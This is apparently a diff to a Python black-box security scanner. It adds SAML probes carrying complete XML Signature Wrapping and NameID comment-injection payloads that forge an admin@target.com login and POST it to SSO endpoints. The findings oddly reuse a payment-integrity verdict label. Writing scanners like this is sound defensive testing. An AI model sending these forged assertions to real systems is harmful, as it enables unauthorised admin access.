@@ -5946,6 +5946,82 @@ class PureBlackBoxEngine:
                                                       "attack": "unsigned_response_with_forged_nameid"})
             except Exception:
                 pass
+        # XSW (XML Signature Wrapping): signed dummy + unsigned forged assertion
+        saml_xsw = (
+            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
+            'ID="_xsw_test" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">'
+            '<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
+            '<ds:SignedInfo><ds:Reference URI="#_signed_dummy"/></ds:SignedInfo>'
+            '<ds:SignatureValue>AAAA</ds:SignatureValue>'
+            '</ds:Signature>'
+            '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
+            'ID="_signed_dummy" Version="2.0">'
+            '<saml:Subject><saml:NameID>nobody@example.com</saml:NameID></saml:Subject>'
+            '</saml:Assertion>'
+            '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
+            'ID="_forged_xsw" Version="2.0">'
+            '<saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>'
+            '<saml:Conditions><saml:AudienceRestriction>'
+            '<saml:Audience>https://target.example.com</saml:Audience>'
+            '</saml:AudienceRestriction></saml:Conditions>'
+            '<saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z"/>'
+            '</saml:Assertion></samlp:Response>'
+        )
+        encoded_xsw = _b64.b64encode(saml_xsw.encode()).decode()
+        for path in saml_paths:
+            try:
+                result = await sess.call("POST", path,
+                                         data=f"SAMLResponse={encoded_xsw}",
+                                         headers={"Content-Type": "application/x-www-form-urlencoded"})
+                if result.status_code and result.status_code in (200, 302):
+                    body = getattr(result, "text", "")
+                    if any(kw in body.lower() for kw in
+                           ("session", "token", "authenticated", "welcome", "dashboard")):
+                        return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "critical",
+                                             f"SAML XSW: dual-assertion wrapping accepted at {path}. "
+                                             "Parser validated signed dummy but acted on unsigned forged assertion.",
+                                             reasons=[f"saml_xsw_accepted:{path}"],
+                                             metrics={"technique": "xml_signature_wrapping",
+                                                      "path": path,
+                                                      "status": result.status_code,
+                                                      "attack": "xsw_dual_assertion"})
+            except Exception:
+                pass
+
+        # Comment injection in NameID: admin@target.com<!-- -->.evil.com
+        saml_comment = (
+            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
+            'ID="_comment_test" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">'
+            '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
+            'ID="_assertion_comment" Version="2.0">'
+            '<saml:Subject><saml:NameID>admin@target.com'
+            '<!-- -->.evil.com</saml:NameID></saml:Subject>'
+            '<saml:Conditions><saml:AudienceRestriction>'
+            '<saml:Audience>https://target.example.com</saml:Audience>'
+            '</saml:AudienceRestriction></saml:Conditions>'
+            '<saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z"/>'
+            '</saml:Assertion></samlp:Response>'
+        )
+        encoded_comment = _b64.b64encode(saml_comment.encode()).decode()
+        for path in saml_paths:
+            try:
+                result = await sess.call("POST", path,
+                                         data=f"SAMLResponse={encoded_comment}",
+                                         headers={"Content-Type": "application/x-www-form-urlencoded"})
+                if result.status_code and result.status_code in (200, 302):
+                    body = getattr(result, "text", "")
+                    if "admin" in body.lower() and "evil" not in body.lower():
+                        return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "critical",
+                                             f"SAML comment injection: NameID truncated at {path}. "
+                                             "XML comment stripped '.evil.com', authenticating as admin@target.com.",
+                                             reasons=[f"saml_comment_injection:{path}"],
+                                             metrics={"technique": "saml_comment_injection",
+                                                      "path": path,
+                                                      "attack": "nameid_comment_truncation"})
+            except Exception:
+                pass
+
+        # Replay attack
         for path in saml_paths:
             try:
                 replay_result = await sess.call("POST", path,
@@ -5964,7 +6040,7 @@ class PureBlackBoxEngine:
             except Exception:
                 pass
         return self._finding(hyp, Verdict.RULED_OUT, "medium",
-                             "SAML/SSO endpoints reject unsigned and replayed assertions.",
+                             "SAML/SSO endpoints reject unsigned, XSW, comment-injected, and replayed assertions.",
                              reasons=["saml_clean"])
 
     async def _api_version_downgrade_probe(self, cs: ControlState) -> Finding | None:
